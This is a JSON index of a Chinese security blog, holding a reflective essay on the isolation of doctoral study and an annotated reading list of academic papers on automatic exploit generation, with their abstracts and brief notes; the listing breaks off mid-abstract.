{"meta":{"title":"Mr.Ma3k4H3d","subtitle":"竹杖芒鞋轻胜马，一蓑烟雨任平生。","description":"CVE Binary PWN hacker web security angr rex ida hack code python github hexo","author":"Mr.Ma3k4H3d","url":"http://maskhed.github.io"},"pages":[{"title":"404","date":"2018-10-21T04:29:40.972Z","updated":"2018-10-21T04:29:40.972Z","comments":true,"path":"404.html","permalink":"http://maskhed.github.io/404.html","excerpt":"","text":""},{"title":"Angr","date":"2018-12-19T02:26:55.000Z","updated":"2018-12-19T13:44:55.668Z","comments":true,"path":"Angr/index.html","permalink":"http://maskhed.github.io/Angr/index.html","excerpt":"","text":""},{"title":"CGC","date":"2018-11-01T15:01:28.000Z","updated":"2018-11-01T15:08:42.282Z","comments":true,"path":"CGC/index.html","permalink":"http://maskhed.github.io/CGC/index.html","excerpt":"","text":""},{"title":"AEG","date":"2018-10-21T07:19:35.000Z","updated":"2018-12-20T03:42:51.632Z","comments":true,"path":"AEG/index.html","permalink":"http://maskhed.github.io/AEG/index.html","excerpt":"","text":""},{"title":"Fuzz","date":"2018-10-21T07:17:49.000Z","updated":"2018-11-10T03:48:18.557Z","comments":true,"path":"Fuzz/index.html","permalink":"http://maskhed.github.io/Fuzz/index.html","excerpt":"","text":""},{"title":"CVE","date":"2018-10-21T07:50:28.000Z","updated":"2018-10-21T07:50:44.320Z","comments":true,"path":"CVE/index.html","permalink":"http://maskhed.github.io/CVE/index.html","excerpt":"","text":""},{"title":"Github","date":"2018-10-21T07:25:05.000Z","updated":"2018-11-10T03:45:02.041Z","comments":true,"path":"Github/index.html","permalink":"http://maskhed.github.io/Github/index.html","excerpt":"","text":""},{"title":"Hexo","date":"2018-10-21T06:41:37.000Z","updated":"2018-10-21T15:01:30.222Z","comments":true,"path":"Hexo/index.html","permalink":"http://maskhed.github.io/Hexo/index.html","excerpt":"","text":""},{"title":"Mr.Robot","date":"2018-11-27T08:02:42.000Z","updated":"2018-11-27T13:04:53.919Z","comments":true,"path":"Mr.Robot/index.html","permalink":"http://maskhed.github.io/Mr.Robot/index.html","excerpt":"","text":""},{"title":"PWN","date":"2018-11-09T02:26:55.000Z","updated":"2018-12-20T03:39:09.345Z","comments":true,"path":"PWN/index.html","permalink":"http://maskhed.github.io/PWN/index.html","excerpt":"","text":""},{"title":"SS","date":"2018-10-21T07:22:01.000Z","updated":"2018-11-10T03:43:24.390Z","comments":true,"path":"SS/index.html","permalink":"http://maskhed.github.io/SS/index.html","excerpt":"","text":""},{"title":"Vim","date":"2018-10-21T06:41:37.000Z","updated":"2018-10-21T06:43:02.769Z","comments":true,"path":"Vim/index.html","permalink":"http://maskhed.github.io/Vim/index.html","excerpt":"","text":""},{"title":"","date":"2018-10-21T08:33:13.000Z","updated":"2019-03-29T15:17:25.180Z","comments":true,"path":"history/index.html","permalink":"http://maskhed.github.io/history/index.html","excerpt":"","text":""},{"title":"《Seven times have I despised my soul》","date":"2018-10-21T08:33:13.000Z","updated":"2019-02-27T14:20:56.627Z","comments":true,"path":"history/index-old.html","permalink":"http://maskhed.github.io/history/index-old.html","excerpt":"","text":""},{"title":"技术分享","date":"2018-11-10T06:33:54.000Z","updated":"2018-12-20T04:06:24.435Z","comments":true,"path":"技术分享/index.html","permalink":"http://maskhed.github.io/技术分享/index.html","excerpt":"","text":""},{"title":"漏洞分析","date":"2018-11-09T02:26:55.000Z","updated":"2018-12-20T03:57:43.524Z","comments":true,"path":"漏洞分析/index.html","permalink":"http://maskhed.github.io/漏洞分析/index.html","excerpt":"","text":""},{"title":"随笔杂谈","date":"2018-11-08T02:26:55.000Z","updated":"2018-12-20T03:50:20.570Z","comments":true,"path":"随笔杂谈/index.html","permalink":"http://maskhed.github.io/随笔杂谈/index.html","excerpt":"","text":""}],"posts":[{"title":"即使风雨兼程，也能守得云开见月明","slug":"风雨兼程","date":"2020-12-08T00:58:56.000Z","updated":"2018-11-27T13:31:05.032Z","comments":true,"path":"2020/12/08/风雨兼程/","link":"","permalink":"http://maskhed.github.io/2020/12/08/风雨兼程/","excerpt":"本文是某次刷知乎时偶然看到的，虽然作者以“读博”为例，但“修真之旅”却并不仅限于此。每次读来都深以为然，无论如何，愿自己在“修真之旅”中也能够“守得云开见月明”。","text":"本文是某次刷知乎时偶然看到的，虽然作者以“读博”为例，但“修真之旅”却并不仅限于此。每次读来都深以为然，无论如何，愿自己在“修真之旅”中也能够“守得云开见月明”。 读博士期间的抑郁非常普遍，我读博的头两年也是如此，每天暗无天日，浑浑噩噩。现在回头想想，这种不开心是“根儿”上的，是读博士⽆法避免的。 首先，“博士”到底是个什么东西呢?我刚到耶鲁的时候，研究生院的院长Tom Pollard曾经为我们解释过，他说“当你可以把Dr.放在名字的前面时，就意味着你成为了一位独⽴科学家 (independent scientist)!” 之前我⼀直把注意力放在“科学家”上，觉得离童年的梦想越来越近了。直到最近我才意识到这句话的关键不在“科学家”，而在“独立”二字!其实你在读博士之前就已经可以搞科研了，你可以大量地阅读文献，可以做⼀些尝试性的实验，甚至是发表学术论文。但是这些并不是博士培养的全部，甚至都不是博⼠培养的重点!重点是“独立”二字，也就是在问题描述里反复出现的“孤独”，“⼀个人”之类的不开心的源泉。这种不开心是“根⼉”上的，是无法避免的!当你开始博士的修真之旅后，你就会像他一样: 独立意味着你要在这茫茫沙漠中独自寻找前进的方向，你的每一步都可能是人类全新的征途;独立意味着你要在这全新的征途中独自克服一切困难，没有人能告诉你面前的那座山要怎么去翻;独立意味着当你千辛万苦翻过那座山后，⽆论看到的是绿洲还是另一⽚沙漠，你都只能独自享受，无法同任何人分享。这条路，你要一个人走!那种被边缘化、被世界遗弃的感觉会一直伴随着你，直到你放弃或者走不动了为止。你可能会问，不是还有博士生导师吗?而我要告诉你的是，导师其实就是那个远在56,000,000公里以外的地球指挥官: 他说:“去火星吧!” 你就踏上了征途。之后他能做的就是不定期看看你是不是还活着，是不是还在继续前进。虽然他可以时不时地为你指引方向，为你提供援助，甚至是在你翻⼭越岭时为你加油鼓气，在你抵达绿洲时为你欢呼雀跃。但每一步路你都要自己走，每种苦你都得自己吃。更重要的是，当陪伴你一段旅程后，除了精神上的支持，那个远在56,000,000公里以外的导师什么都做不了，你终归还是要独立的!这条路上，你不仅要忍耐孤独，还要学会享受孤独。 你要练就自娱自乐甚至是⾃黑的能力: 还要不断寻找前进的动力，精神的寄托: 当你终于找到那片绿色时，即使无人可以分享，你也会觉得这一切的一切都是值得的: 愿你一路好走!即使风雨兼程，也能守得云开⻅⽉明!","categories":[{"name":"随笔杂谈","slug":"随笔杂谈","permalink":"http://maskhed.github.io/categories/随笔杂谈/"}],"tags":[]},{"title":"AEG Papers","slug":"AEG-papers","date":"2019-05-29T11:16:30.000Z","updated":"2019-05-29T12:30:49.825Z","comments":true,"path":"2019/05/29/AEG-papers/","link":"","permalink":"http://maskhed.github.io/2019/05/29/AEG-papers/","excerpt":"","text":"软件漏洞发掘是当前的热点问题。尽管模糊测试技术帮助我们解决了程序漏洞的自动发现问题，并行模糊测试平台已经可以高效的发现大量的程序错误，但无论是防御者还是攻击者，都更关心这些程序漏洞或错误是否可能被利用。如何快速分析、评估漏洞的可利用性是当前漏洞发掘与分析的关键问题之一。传统软件漏洞利用主要以手工方式构造，该过程不仅需要具备较为全面的系统底层知识(包括文件格式，汇编代码，操作系统内部机理以及处理器架构等)，同时还需要对漏洞机理深入、细致的分析，才可能构造成功的利用。在软件功能越来越复杂，漏洞越来越多样化的趋势下，传统利用方式已难以应对上述挑战。目前，随着程序分析技术的不断发展，尤其是污点分析、符号执行等技术成功运用在软件动态分析以及软件漏洞挖掘等多个领域后，研究者开始尝试利用这些技术来进行高效的软件漏洞利用自动构造。 –《软件漏洞自动利用研究进展》 Paper List：Chinese： 《软件漏洞自动利用研究进展》 – 《中国教育网络》 2016年Z1期 《漏洞利用自动生成算法的设计与实现》 – 学位论文 《二进制程序整型溢出漏洞的自动验证方法》 – 《信息网络安全》 2017年第5期 《基于符号执行的自动利用生成系统》 – 计算机系统应用 2017年10月 《二进制程序自动化漏洞利用方法研究》 – 学位论文 《基于符号执行的Return-to-dl-resolve利用代码自动生成方法》 《基于插桩技术的漏洞自动化验证研究与实现》– 学位论文 《基于动态分析的漏洞自动化验证技术研究》 – 学位论文 《基于模拟攻击的内核提权漏洞自动利用系统》 – 《中国科学院大学学报》 2015年03期 English： 《CRAX: Software Crash Analysis for Automatic Exploit Generation by Modeling Attacks as Symbolic Continuations》 《Automatic Generation of Control Flow Hijacking Exploits for Software Vulnerabilities》 《SoK: (State of) The Art of War: Offensive Techniques in Binary Analysis》 – S&amp;P 2016 《Software Crash Analysis for Automatic Exploit Generation on Binary Programs》 《FUZE: Towards Facilitating Exploit Generation for Kernel Use-After-Free Vulnerabilities》 《Automated exploit generation for stack buffer overflow vulnerabilities》 《AEG: Automatic Exploit Generation》 – NDSS 2011 《Automatic Exploit Generation》 《Unleashing MAYHEM on Binary Code》 – S&amp;P 2012 《Q: Exploit Hardening Made Easy》 – USENIX 2011 《Automatic Patch-Based Exploit Generation is Possible: Techniques and Implications》 – S&amp;P 2008 《Revery: From Proof-of-Concept to Exploitable》 – CCS 2018 《Automatic Polymorphic Exploit Generation for Software Vulnerabilities》 《Exploit Generation for Information Flow Leaks in Object-Oriented Programs》 《Survey of Automated Vulnerability Detection and Exploit Generation Techniques in Cyber Reasoning Systems》 《Towards Automated Exploit Generation for Embedded Systems》 《Transformation-aware Exploit Generation using a HICFG》 《System Service Call-oriented Symbolic Execution of Android Framework with Applications to Vulnerability Discovery and Exploit Generation》 对 AEG 方向的经典论文进行梳理，如下图所示： 《软件漏洞自动利用研究进展》123《中国教育网络》 2016年Z1期 中科院软件所和亮，苏璞睿 摘要：软件漏洞发掘是当前的热点问题。尽管模糊测试技术帮助我们解决了程序漏洞的自动发现问题，并行模糊测试平台已经可以高效的发现大量的程序错误，但无论是防御者还是攻击者，都更关心这些程序漏洞或错误是否可能被利用。如何快速分析、评估漏洞的可利用性是当前漏洞发掘与分析的关键问题之一。传统软件漏洞利用主要以手工方式构造，该过程不仅需要具备较为全面的系统底层知识(包括文件格式，汇编代码，操作系统内部机理以及处理器架构等)，同时还需要对漏洞机理深入、细致的分析，才可能构造成功的利用。在软件功能越来越复杂，漏洞越来越多样化的趋势下，传统利用方式已难以应对上述挑战。目前，随着程序分析技术的不断发展，尤其是污点分析、符号执行等技术成功运用在软件动态分析以及软件漏洞挖掘等多个领域后，研究者开始尝试利用这些技术来进行高效的软件漏洞利用自动构造。 《漏洞利用自动生成算法的设计与实现》123西安电子科技大学 2017.06 戴春春、段振华、王小兵（工硕） 摘要：随着网络的普及，信息的安全性遭到了很大的威胁。通过利用软件漏洞，攻击者可以获取用户存放在手机、电脑、网站上的各种信息。攻击者和防御者都在寻找软件中的漏洞，前者希望通过利用漏洞攻击系统，后者希望能够修复漏洞和防御攻击。为了证明一个漏洞是高危的，最可靠的方法是为它构造一个漏洞利用。因此，无论是攻击者还是防御者都非常关注漏洞利用相关的研究。手工的漏洞利用构造过程需要非常丰富的底层知识，包括汇编语言、操作系统、CPU架构等，对操作者的水平有很高的要求，也非常消耗精力和时间。随着软件规模的增加，软件在运行过程中进行了复杂的运算，拥有数目众多的路径分支。而漏洞利用的过程中需要对软件的控制流和数据流进行分析。手工完成这些任务无疑是困难的。本文提出了一种漏洞利用自动生成算法。对于给定的二进制可执行代码，算法自动发现程序中存在的漏洞，对漏洞进行分析并创建一个精心构造的输入。使用该输入驱动程序，将触发程序中的漏洞，劫持程序的控制流并执行恶意代码。在本文的算法中，采用模糊测试技术实现了漏洞的自动发现，并将导致程序崩溃的输入记录下来，从而能够分析每一个崩溃对应的漏洞路径。在随后的分析过程中，采用污点分析的方法获取程序的控制流和数据流信息，对受到输入影响的内存布局进行记录。通过分析程序运行中与输入相关的控制流约束，保证程序使用新构造的漏洞利用运行依然能到达漏洞所在地点。通过将跳转指令和shellcode布置到内存中，保证程序能够跳转到恶意代码。为了能够分析动态生成和下载的代码，算法使用动态二进制插桩框架实现上述过程。算法采用了多种shellcode和跳转指令的组合，增加更多的跳转指令分析，一方面增加了构造出漏洞利用的概率，另一方面也预防针对某种跳转指令的检查。理论分析与实验结果表明:本文所提出的漏洞利用自动生成算法是有效的。 《二进制程序整型溢出漏洞的自动验证方法》123《信息网络安全》 2017年第5期 信大 彭建山，奚琪，王清贤 摘要：整型溢出漏洞已成为威胁软件安全的第二大类漏洞，现有的整型溢出漏洞挖掘工具不支持自动验证漏洞，且现有的漏洞自动验证工具不支持整型溢出漏洞模式。因此，文章提出了一种二进制程序整型溢出漏洞的自动验证方法以填补这一空白。针对整型溢出漏洞中有价值的 IO2BO 漏洞，为避免程序在缓冲区溢出过程中发生 Crash 导致无法劫持控制流，通过污点分析建立可疑污点集合以缩小待分析污点范围，利用污点回溯技术追踪污点来源，通过符号执行收集内存读写操作的循环条件，控制循环次数以覆盖堆栈关键数据，最后通过约束求解生成新样本，将 IO2BO 漏洞的自动验证问题转化为传统缓冲区溢出漏洞的自动验证。实验证明该方法能够自动验证典型的 IO2BO 漏洞，生成能够劫持控制流并执行任意代码的新样本。 《基于符号执行的自动利用生成系统》123《计算机系统应用》 2017年10月期 中国科学院大学 中国科学院软件研究所 深圳大学深圳南特商学院 万云鹏 邓艺 石东辉 程亮 张阳 摘要：在本文中，我们提出 BAEG，一个自动寻找二进制程序漏洞利用的系统。BAEG 为发现的每一个漏洞产生一个控制流劫持的利用，因此保证了它所发现的漏洞都是安全相关并且可利用的。BAEG 针对输入造成程序崩溃的情况进行分析，面临的挑战主要有两点：1) 如何重现崩溃路径，获取崩溃状态；2) 如何自动生成控制流劫持利用。对于第一点，本论文提出路径导向算法，将崩溃输入作为符号值，重现崩溃路径。对于第二点，我们总结多种控制流劫持的利用原理，建立对应的利用产生模型。此外，对于非法符号读、写操作，BAEG 还可以让程序从崩溃点继续执行，探索程序深层次代码，检测崩溃路径逻辑深处是否还有利用点。 《二进制程序自动化漏洞利用方法研究》123华中科技大学 2017年5月 贺玄 李伟明 摘要：如何自动化地挖掘二进制程序漏洞并生成漏洞利用代码是当前软件安全领域研究的一个热点。目前的漏洞自动化利用方案都还处于较为初期的阶段，存在漏洞利用类型简单、对生成的 Exploit 没有进一步验证等问题。因此提出基于二进制程序的自动化漏洞利用方法，该方法希望能进一步完善目前的自动化漏洞利用技术。基于二进制程序的自动化漏洞利用方法分为三个模块：动态符号化执行模块、验证模块和 Exploit 校正模块。动态符号化执行模块负责探索出有漏洞的路径，结合漏洞现场分析其类型，然后判断是否满足利用约束，满足则添加该约束生成 Exploit。可利用的漏洞类型有栈溢出和函数指针覆盖两类，利用方案有代码注入和代码复用两类具体四种利用方案。验证模块负责将产生的 Exploit 提供给程序实际执行，判断 Exploit是否有效。若在验证中发生了崩溃，则将 Exploit 交给 Exploit 校正模块。Exploit 校正模块负责使用动态污点跟踪的方法在汇编指令级跟踪 Exploit 在程序运行中的传播过程，确定崩溃是由 Exploit 中的哪些字节导致的，然后对该字节进行变异、再验证，如此反复直至 Exploit 可用。根据以上提出的方法，实现了基于二进制程序的自动化漏洞利用的原型系统：以符号化执行引擎 Angr 为平台进行动态符号化执行分析二进制程序，完成漏洞挖掘和利用的步骤；以 Pin 为二进制插桩平台，在汇编指令级进行污点传播指令插桩，进行动态污点跟踪分析，完成自动化校正 Exploit 的步骤。经过对 11 个 CTF 题目样本的测试，原型系统能够对微小型程序全自动地完成漏洞挖掘、利用和自动化校正 Exploit 的工作，证明使用动态污点跟踪方法完成对 Exploit 的校正是有效可行的。 《基于符号执行的 Return-to-dl-resolve利用代码自动生成方法》123《计算机科学》 2019年2月期 陆军工程大学指挥控制工程学院 方 皓 吴礼发 吴志勇 摘要：Return-to-dl-resolve 是一种可突破复杂防护机制的通用漏洞利用技术，目前主要以手工方式实现，研究人员需要深入分析并理解 ELF动态链接原理，泄露并解析任意库函数的地址，拼装攻击载荷，效率非常低。文中提出了一 种基于符号执行的 Return-to-dl-resolve自动化实现方法，该方法为 ELF可执行文件提供符号执行环境，对程序崩溃点的符号状态进行约束，通过约束求解器对约束进行求解，实现了 Return-to-dl-resolve利用代码自动生成系统 R2dlAEG。 实验结果表明，R2dlAEG 可快速构造利用代码，并能够在 NX 和 ASLR 防护机制同时开启的条件下劫持程序的控制流。 《基于动态分析的漏洞自动化验证技术研究》123电子科技大学 2017.06 张小松、刘路遥 摘要：近年来互联网恶意攻击事件频发，各大安全平台捕获的攻击样本数量不断增多，样本分析成为了互联网安全研究领域的重点。样本分析中的一个核心环节就是漏洞验证。漏洞验证即验证样本是否利用了软件漏洞进行攻击，具体的验证内容包括漏洞类型和攻击手段。传统的漏洞验证通常采用人工分析的方式，然而人工分析存在效率低下和成本较高的问题，因此研究一种漏洞自动化验证的新方法来缓解这些问题就显得很有意义。针对此需求，本文从动态分析技术出发，提出了对大量样本进行漏洞自动化验证的新方法，并设计和实现了验证系统原型。漏洞自动化验证方法分为环境搭建和验证规则设计两个方面，对此，本文进行了如下研究：1。本文研究了环境搭建所面临两个主要问题。 一是单一样本进行漏洞验证，所需的环境有什么特征；二是在样本类型复杂的情况下，如何构建方案来满足所需环境复杂的需求。本文归纳出单一样本所需环境的特征，并对其做出形式化描述。在此基础上，提出了漏洞自动化验证的环境搭建方案。该方案采取将样本分发至环境集群的方法，提高环境匹配的成功率。进一步，针对环境集群搭建成本高的问题，本文提出了软件环境集合划分算法，在不降低漏洞验证的准确率前提下，减少了环境搭建的成本。2。本文研究了缓冲区溢出漏洞和ROP攻击的自动化验证规则。通过分析缓冲区溢出漏洞触发时函数返回地址特征，提出了基于函数返回地址匹配的规则来验证样本是否触发了缓冲区溢出漏洞。通过构造大量的ROP攻击链，分析链中Gadget的长度特征，以及Gadget中Ret指令之前两条指令的行为特征，构建出了基于统计规则和行为规则的ROP攻击混合检测方案。3。针对不同平台下动态分析技术的优劣，选择基于调试器和动态插桩的技术，搭建环境集群，实现了漏洞自动化验证原型系统。采用实际的攻击样本对系统进行了功能和性能测试，测试结果表明，本验证系统误报率更低性能更好。 Note：文中所解决的“漏洞自动化验证问题”属于恶意样本分析范畴中的漏洞信息分析环节。分析的信息包括是否利用漏洞，利用漏洞的类型，利用漏洞的方式以及漏洞利用的细节（如漏洞产生地址，产生时上下文信息等）。漏洞验证的方法主要是通过对程序的动态跟踪，分析出程序流程，同时通过对象生存周期分析以及线程上下文分析等手段，获取程序运行时的内存空间，内存权限以及函数栈的调用情况。据此来判定程序是否产生溢出等非法行为。漏洞验证，是对程序进行逆向分析的一个过程。这个过程的目的是分析出程序是否利用了漏洞以及利用漏洞的方式和利用漏洞的具体信息。与“漏洞利用自动生成”不属于一类问题。 《基于插桩技术的漏洞自动化验证研究与实现》123电子科技大学 2016.06 杨国武、向琦（工硕） 摘要：近年来，随着科技的发展，互联网的逐步成熟，互联网安全是人们讨论的热门话题，漏洞作为互联网的核心更是各大公司和科研机构重点研究的对象，首先文章研究了漏洞相关理论和插桩原理，然后提炼出基于插桩技术的漏洞自动化验证平台方案。该平台从功能上主要分为两个版块：漏洞验证控制端和漏洞验证服务端。其中漏洞验证控制端设计采用 MFC 简约界面负责人机交互和漏洞相关参数配置，里面还包含虚拟机管理模块，负责分发样本至对应的虚拟机。漏洞验证服务端里面包含了虚拟机管理集群模块，每台虚拟机内置有漏洞验证服务端，用来自动化验证未知样本漏洞，样本验证之后采用监控文件系统的方式对样本行为进行记录，最后设计漏洞库用来保存样本信息。本文的研究内容主要有以下几个部分：1。深入调研了各类插桩工具，并比较其优劣，针对本文的 Pin 插桩工具，详细研究了它的工作原理以及插桩规则的编写。2。在 Linux 环境下提出了基于插桩技术的漏洞自动化验证平台概念，该平台采用 C/S 结构实现自动化功能，即控制端和服务端模式，控制端分为用户交互模块，负责人机交互，下达漏洞验证指令；虚拟机管理模块负责分类处理验证漏洞样本的有效性；通信模块，采用重叠 I/O 技术实现异步交互。服务端分为漏洞触发判定模块，主要负责对未知样本进行插桩验证，漏洞攻击感知模块则是负责监控样本的行为，最后漏洞数据库负责存储漏洞相关信息。3。虚拟机管理模块主要是负责虚拟机环境的部署，主要分为操作系统版本和应用软件版本，应用软件版本有诸如聊天工具、下载工具、办公工具等。同类软件部署在一个测试环境中，节约资源同时也方便管理。4。论文在漏洞触发判定模块中，研究了缓冲区溢出漏洞和 ROP 漏洞的触发机制，编写出与之对应的插桩规则，该平台能够很好地对这两类漏洞样本进行验证。此外，漏洞触发判定模块提供漏洞验证接口，以供其他漏洞类型地验证。5。设计了 Linux 文件检测模块，通过 LKM 技术，实现了对漏洞样本触发漏洞后的文件操作进行监控。6。建立了漏洞数据库，能够对可以利用的漏洞进行信息录入，供专业人员进行查询和二次利用。 《基于模拟攻击的内核提权漏洞自动利用系统》123《中国科学院大学学报》 2015年03期 中国科学院大学 国家计算机网络入侵防范中心李晓琦，刘奇旭，张玉清 摘要：针对 Linux 下的内核级提权漏洞，基于模拟攻击的漏洞检测思想，设计并开发漏洞自动利用系统 KernelPET，揭示典型提权漏洞的利用过程，从而为漏洞防御提供支持。KernelPET 系统与主流漏洞库 exploit-db、securityfocus 等衔接，模拟攻击测试近百个提权漏洞，挑选 30 个 经典的 Linux 内核提权漏洞载入 KernelPET 漏洞代码库，并基于不同内核、不同发行版的 Linux 平台测试。实验结果表明，KernelPET 在多类发行版 Linux 系统下具有较好的效果。 Note：本文侧重点在于“漏洞的自动利用”，并非“漏洞利用的自动生成”。 《CRAX: Software Crash Analysis for Automatic Exploit Generation》123456@article&#123; title=&#123;CRAX: Software Crash Analysis for Automatic Exploit Generation by Modeling Attacks as Symbolic Continuations&#125;, author=&#123;Shih-Kun Huang, Min-Hsiang Huang, Po-Yen Huang&#125;, booktitle=&#123;IEEE Sixth International Conference on Software Security and Reliability&#125;,year=&#123;2012&#125;&#125; Abstract:We present a simple framework capable of automatically generating attacks that exploit control flow hijacking vulnerabilities. We analyze given software crashes and perform symbolic execution in concolic mode, using a whole system environment model. The framework uses an end-to-end approach to generate exploits for various applications, including 16 medium scale benchmark programs, and several large scale applications, such as Mplayer (a media player), Unrar (an archiver) and Foxit(a pdf reader), with stack/heap overflow, off-by-one overflow, use of uninitialized variable, format string vulnerabilities. Notably, these applications have been typically regarded as fuzzing preys, but still require a manual process with security knowledge to produce mitigation-hardened exploits. Using our system to produce exploits is a fully automated and straightforward process for crashed software without source. We produce the exploits within six minutes for medium scale of programs, and as long as 80 minutes for mplayer (about 500,000 LOC), after constraint reductions. Our results demonstrate that the link between software bugs and security vulnerabilities can be automatically bridged. Notes:作者实现了一套漏洞利用自动生成系统 CRAX，系统以二进制程序及能够使该程序产生崩溃的 Crash 作为输入，通过基于 S2E 的 concolic 方法进行分析，并最终生成利用程序。 CRAX 能够对以下五种类型的漏洞进行分析，实现了 “Return-to-memory”、“Return-to-libc”、“Jump-to-register” 三种方式的漏洞利用。 作者共设计了五组对比试验用以评估 CRAX 系统的有效性： 对五种不同类型的漏洞自动生成利用程序； 能够生成不同类型的漏洞利用，实现与防护机制的对抗，证明系统在真实环境中的有效性； 对 AEG 中的 16 个真实样本进行测试，实现与 AEG 的横向对比； 对比原始 concolic 与改进后的 concolic，证明优化的有效性； 在真实环境下对大型应用程序进行测试； 《Automatic Generation of Control Flow Hijacking Exploits for Software Vulnerabilities》123456@article&#123;title=&#123;Automatic Generation of Control Flow Hijacking Exploits for Software Vulnerabilities&#125;, author=&#123;Sean Heelan&#125;, booktitle=&#123;Doctoral thesis&#125;, year=&#123;2009&#125;&#125; Abstract:Software bugs that result in memory corruption are a common and dangerous feature of systems developed in certain programming languages. Such bugs are security vulnerabilities if they can be leveraged by an attacker to trigger the execution of malicious code. Determining if such a possibility exists is a time consuming process and requires technical expertise in a number of areas. Often the only way to be sure that a bug is in fact exploitable by an attacker is to build a complete exploit. It is this process that we seek to automate. We present a novel algorithm that integrates data-flow analysis and a decision procedure with the aim of automatically building exploits. The exploits we generate are constructed to hijack the control flow of an application and redirect it to malicious code.Our algorithm is designed to build exploits for three common classes of security vulnerability; stack-based buffer overflows that corrupt a stored instruction pointer, buffer overflows that corrupt a function pointer, and buffer overflows that corrupt the destination address used by instructions that write to memory. For these vulnerability classes we present a system capable of generating functional exploits in the presence of complex arithmetic modification of inputs and arbitrary constraints. Exploits are generated using dynamic data-flow analysis in combination with a decision procedure. To the best of our knowledge the resulting implementation is the first to demonstrate exploit generation using such techniques. We illustrate its effectiveness on a number of benchmarks including a vulnerability in a large, real-world server application. 《SoK: (State of) The Art of War: Offensive Techniques in Binary Analysis》12345678910@article&#123; title=&#123; SoK: (State of) The Art of War: Offensive Techniques in Binary Analysis &#125;,author=&#123; Shoshitaishvili, Yan and Wang, Ruoyu and Salls, Christopher and Stephens, Nick and Polino, Mario and Dutcher, Audrey and Grosen, John and Feng, Siji and Hauser, Christophe and Kruegel, Christopher and Vigna, Giovanni &#125;, booktitle=&#123; S&amp;P &#125;, year=&#123; 2016 &#125;&#125; Abstract:Finding and exploiting vulnerabilities in binary code is a challenging task. The lack of high-level, semantically rich information about data structures and control constructs makes the analysis of program properties harder to scale. However, the importance of binary analysis is on the rise. In many situations binary analysis is the only possible way to prove (or disprove) properties about the code that is actually executed.In this paper, we present a binary analysis framework that implements a number of analysis techniques that have been proposed in the past. We present a systematized implementation of these techniques, which allows other researchers to compose them and develop new approaches. In addition, the implementation of these techniques in a unifying framework allows for the direct comparison of these approaches and the identification of their advantages and disadvantages. The evaluation included in this paper is performed using a recent dataset created by DARPA for evaluating the effectiveness of binary vulnerability analysis techniques.Our framework has been open-sourced and is available to the security community. 《Software Crash Analysis for Automatic Exploit Generation on Binary Programs》123456@article&#123; title=&#123; Software Crash Analysis for Automatic Exploit Generation on Binary Programs &#125;, author=&#123;Shih-Kun Huang, Min-Hsiang Huang, Po-Yen Huang, Chung-Wei Lai &#125;, booktitle=&#123; IEEE Transactions on Reliability &#125;, year=&#123;2014&#125; &#125; Abstract:This paper presents a new method, capable of automatically generating attacks on binary programs from software crashes. We analyze software crashes with a symbolic failure model by performing concolic executions following the failure directed paths, using a whole system environment model and concrete address mapped symbolic memory in S2E. We propose a new selective symbolic input method and lazy evaluation on pseudo symbolic variables to handle symbolic pointers and speed up the process. This is an end-to-end approach able to create exploits from crash inputs or existing exploits for various applications, including most of the existing benchmark programs, and several large scale applications, such as a word processor (Microsoft office word), a media player (mpalyer), an archiver (unrar), or a pdf reader (foxit). We can deal with vulnerability types including stack and heap overflows, format string, and the use of uninitialized variables. Notably, these applications have become software fuzz testing targets, but still require a manual process with security knowledge to produce mitigation-hardened exploits. Using this method to generate exploits is an automated process for software failures without source code. The proposed method is simpler, more general, faster, and can be scaled to larger programs than existing systems. We produce the exploits within one minute for most of the benchmark programs, including mplayer. We also transform existing exploits of Microsoft office word into new exploits within four minutes. The best speedup is 7,211 times faster than the initial attempt. For heap overflow vulnerability, we can automatically exploit the unlink() macro of glibc, which formerly requires sophisticated hacking efforts. 《FUZE: Towards Facilitating Exploit Generation for Kernel Use-After-Free Vulnerabilities》123456@article&#123; title=&#123;FUZE: Towards Facilitating Exploit Generation for Kernel Use-After-Free Vulnerabilities&#125;, author=&#123; Wei Wu, Yueqi Chen, Jun Xu, Xinyu Xing, Xiaorui Gong, Wei Zou] &#125;, booktitle=&#123;USENIX&#125;, year=&#123;2018&#125;&#125; Abstract:Software vendors usually prioritize their bug remediation based on ease of their exploitation. However, accurately determining exploitability typically takes tremendous hours and requires significant manual efforts. To address this issue, automated exploit generation techniques can be adopted. In practice, they however exhibit an insufficient ability to evaluate exploitability particularly for the kernel Use-After-Free (UAF) vulnerabilities. This is mainly because of the complexity of UAF exploitation as well as the scalability of an OS kernel.In this paper, we therefore propose FUZE, a new framework to facilitate the process of kernel UAF exploitation. The design principle behind this technique is that we expect the ease of crafting an exploit could augment a security analyst with the ability to evaluate the exploitability of a kernel UAF vulnerability. Technically, FUZE utilizes kernel fuzzing along with symbolic execution to identify, analyze and evaluate the system calls valuable and useful for kernel UAF exploitation. In addition, it leverages dynamic tracing and an off-the-shelf constraint solver to guide the manipulation of vulnerable object.To demonstrate the utility of FUZE, we implement FUZE on a 64-bit Linux system by extending a binary analysis framework and a kernel fuzzer. Using 15 realworld kernel UAF vulnerabilities on Linux systems, we then demonstrate FUZE could not only escalate kernel UAF exploitability but also diversify working exploits. In addition, we show that FUZE could facilitate security mitigation bypassing, making exploitability evaluation less challenging and more efficient. 《Automated Exploit Generation for Stack Buffer Overflow Vulnerabilities》12345@article&#123; title=&#123;Automated Exploit Generation for Stack Buffer Overflow Vulnerabilities&#125;, author=&#123; V. A. Padaryan, V. V. Kaushan, A. N. Fedotov &#125;, booktitle=&#123; PROGRAMMING AND COMPUTER SOFTWARE &#125;, year=&#123;2015&#125;&#125; Abstract:An automated method for exploit generation is presented. This method allows one to construct exploits for stack buffer overflow vulnerabilities and to prioritize software bugs. The method is based on the dynamic analysis and symbolic execution of programs. It could be applied to program binaries and does not require debug information. The proposed method was used to develop a tool for exploit generation. This tool was used to generate exploits for eight vulnerabilities in Linux and Windows programs, of which three were not fixed at the time this paper was written. Notes:Presently, a lot of solvers are available, such as MiniSat, OpenSMT, STP, Yices, Z3, and others. We used the Z3 due to the following advantages: incremental approach to the solution of equations; support of many data types, including machinelevel data types; there is a C API that allows one to directly invoke the equation solver, which is much more efficient than the work with text input; the source code under the MSR-LA license is available; it is faster than other solvers. 《AEG: Automatic Exploit Generation》123456@article&#123; title=&#123;AEG: Automatic Exploit Generation&#125;, author=&#123;Thanassis Avgerinos, Sang Kil Cha, Brent Lim Tze Hao, David Brumley&#125;, booktitle=&#123;NDSS&#125;, year=&#123;2011&#125;&#125; Abstract:The automatic exploit generation challenge is given a program, automatically find vulnerabilities and generate exploits for them. In 